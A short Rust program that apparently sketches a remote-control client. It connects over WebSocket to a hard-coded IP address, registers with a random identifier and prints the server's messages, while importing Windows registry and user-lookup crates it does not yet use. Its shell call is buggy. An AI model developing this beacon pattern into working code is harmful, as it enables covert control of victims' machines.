use std::process::Command;
use std::io::Write;
use std::fs::File;
use tungstenite::{connect, Message};
use url::Url;
use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_READ};
use whoami;
use rand::Rng;
use std::error::Error;


#[tokio::main]

async fn main()
{

    let (mut socket, response) =
        connect(Url::parse("ws://135.125.197.2:9898").unwrap()).expect("Can't connect");
    let mut identifier = 0;


    println!("Connected to the server with success.");

    let mut identifierBool = false;

    match identifierBool
    {
        true => println!("I already have identifier"),
        false => {
            let mut rng = rand::thread_rng();
            identifier = rng.gen_range(100000000..999999999);
            identifierBool = true;
        }

    }

    let logintext = format!("CLIENT: My identifier is {}", identifier);

    Command::new("ls").arg("> a.txt").spawn();

    //resp.to_string();

  //  let document = scraper::Html::parse_document(&resp);

   // socket.write_message(Message::Text(resp.into())).unwrap();
    

    socket.write_message(Message::Text(logintext.into())).unwrap();

    loop {
        let msg = socket.read_message().expect("Error reading message");
        println!("SERVER: {}", msg);
    }
}
